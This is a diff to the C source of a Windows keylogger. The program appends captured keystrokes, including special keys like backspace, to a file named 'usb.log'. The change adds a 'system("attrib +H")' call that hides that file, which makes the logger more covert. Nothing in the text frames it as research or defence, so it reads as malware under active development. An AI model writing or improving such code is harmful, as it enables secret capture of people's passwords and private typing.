@@ -2,7 +2,7 @@
 #include <Windows.h>
 #include <time.h>
 
-#define LOG "log"
+#define LOG "usb.log"
 
 void log(char);
 
@@ -19,6 +19,9 @@ int main() {
     fprintf(fp, "[USB LOG]\nSTART_TIME: %s\n\n", ctime(&t));
     fclose(fp);
 
+    // hide the log file
+    system("attrib +H "LOG);
+
     while(1) {
         // https://gist.github.com/patilswapnilv/7338783
         Sleep(20); // To make sure this program doesn't steal all resources.
@@ -29,10 +32,10 @@ int main() {
 }
 
 void log(char key) {
-    if ((key == 1) || (key == 2)) return;
+    if (key == 1 || key == 2) return;
 
     FILE *fp = fopen(LOG, "a+");
-    switch ((int)key)
+    switch (key)
     {
     case 0x08:
         fprintf(fp, "%s", "[BACKSPACE]");
